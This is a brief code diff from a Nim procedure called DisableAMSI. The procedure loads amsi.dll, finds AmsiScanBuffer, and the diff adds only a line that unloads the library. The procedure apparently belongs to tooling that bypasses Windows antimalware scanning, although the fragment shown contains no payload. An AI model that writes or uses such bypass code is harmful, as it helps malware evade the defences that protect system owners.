@@ -66,6 +66,7 @@ proc DisableAMSI(): bool =
     if isNil(amsi):
         echo "[X] Failed to load amsi.dll"
         return disabled
+    defer: amsi.unloadLib()
 
     cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
     if isNil(cs):
